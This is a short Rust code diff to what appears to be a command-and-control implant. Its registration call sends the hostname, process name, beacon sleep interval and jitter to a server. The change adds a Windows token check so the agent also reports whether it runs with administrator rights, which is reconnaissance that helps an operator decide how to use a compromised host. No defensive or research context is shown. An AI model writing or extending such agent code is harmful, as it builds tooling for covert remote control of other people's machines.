@@ -212,6 +212,29 @@ impl AgentTransport {
         self.try_register().is_some()
     }
 
+    fn is_elevated() -> bool {
+        use windows_sys::Win32::Foundation::CloseHandle;
+        use windows_sys::Win32::Security::{
+            GetTokenInformation, TOKEN_ELEVATION, TOKEN_QUERY, TokenElevation,
+        };
+        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
+        unsafe {
+            let mut token = 0isize;
+            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
+                return false;
+            }
+            let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
+            let mut sz: u32 = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
+            let ok = GetTokenInformation(
+                token, TokenElevation,
+                &mut elev as *mut _ as *mut core::ffi::c_void,
+                sz, &mut sz,
+            );
+            CloseHandle(token);
+            ok != 0 && elev.TokenIsElevated != 0
+        }
+    }
+
     fn try_register(&mut self) -> Option<()> {
         let body = serde_json::json!({
             "hostname":     std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into()),
@@ -222,6 +245,7 @@ impl AgentTransport {
             "sleep_sec":    config::SLEEP_SEC,
             "jitter_pct":   config::JITTER_PCT,
             "process_name": Self::exe_name(),
+            "is_admin":     Self::is_elevated(),
         });
         let (code, resp) = http_do("POST", "/register", body.to_string().as_bytes())?;
         if code != 200 || resp.is_empty() { return None; }
